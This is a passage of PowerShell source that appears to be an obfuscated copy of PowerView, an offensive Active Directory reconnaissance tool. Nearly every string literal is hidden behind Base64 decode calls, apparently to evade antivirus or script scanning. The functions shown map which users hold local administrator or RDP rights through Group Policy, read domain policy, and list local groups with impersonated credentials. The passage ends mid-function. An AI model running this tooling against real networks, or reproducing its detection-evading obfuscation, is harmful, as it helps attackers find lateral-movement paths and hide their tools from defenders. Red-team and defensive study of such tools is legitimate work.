        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        $TargetSIDs = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            $TargetSIDs = @('*')
        }
        if ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            $TargetLocalSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
            $TargetLocalSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))) -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"
        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }
            $Filters = $_.Filters
            if ($TargetSIDs[0] -eq '*') {
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }
            Get-DomainOU @CommonArguments -Raw -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))) -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($OUComputers) {
                    if ($OUComputers -isnot [System.Array]) {$OUComputers = @($OUComputers)}
                    ForEach ($TargetSid in $TargetObjectSIDs) {
                        $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                        $IsGroup = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        $GPOLocalGroupMapping = New-Object PSObject
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) $GPOGuid
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPOPath
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $GPOType
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.Properties.distinguishedname
                        $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $OUComputers
                        $GPOLocalGroupMapping.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                        $GPOLocalGroupMapping
                    }
                }
            }
            Get-DomainSite @CommonArguments -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA'))) -GPLink $GPOGuid | ForEach-Object {
                ForEach ($TargetSid in $TargetObjectSIDs) {
                    $Object = Get-DomainObject @CommonArguments -Identity $TargetSid -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
                    $IsGroup = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                    $GPOLocalGroupMapping = New-Object PSObject
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) $GPOGuid
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPOPath
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $GPOType
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                    $GPOLocalGroupMapping | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $_.siteobjectbl
                    $GPOLocalGroupMapping.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcA'))))
                    $GPOLocalGroupMapping
                }
            }
        }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $ComputerIdentity,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $CommonArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            $Computers = Get-DomainComputer @CommonArguments -Identity $ComputerIdentity -Properties $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
            if (-not $Computers) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $ComputerIdentity not found. Try a fully qualified host name."
            }
            ForEach ($Computer in $Computers) {
                $GPOGuids = @()
                $DN = $Computer.distinguishedname
                $OUIndex = $DN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))
                if ($OUIndex -gt 0) {
                    $OUName = $DN.SubString($OUIndex)
                }
                if ($OUName) {
                    $GPOGuids += Get-DomainOU @CommonArguments -SearchBase $OUName -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAA=='))))) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAEYAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQA5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_
                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }
                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains $Object.samaccounttype
                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBDAG8AbQBwAHUAdABlAHIATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}
function Get-DomainPolicyData {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $ConvertArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $ConvertArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
        }
        if ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwA')))) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = '*'
        }
        elseif ($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        elseif (($Policy -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgA=')))) -or ($Policy -eq 'DC')) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        }
        else {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Policy
        }
        $GPOResults = Get-DomainGPO @SearcherArguments
        ForEach ($GPO in $GPOResults) {
            $GptTmplPath = $GPO.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ParseArgs[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPO.name
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPO.displayname
                $_
            }
        }
    }
}
function Get-NetLocalGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }
    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
                $Offset = $PtrInfo.ToInt64()
                if (($Result -eq 0) -and ($Offset -gt 0)) {
                    $Increment = $LOCALGROUP_INFO_1::GetSize()
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1
                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment
                        $LocalGroup = New-Object PSObject
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $Computer
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $Info.lgrpi1_name
                        $LocalGroup | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) $Info.lgrpi1_comment
                        $LocalGroup.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AYwBhAGwARwByAG8AdQBwAC4AQQBQAEkA'))))
                        $LocalGroup
                    }
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                }
                else {
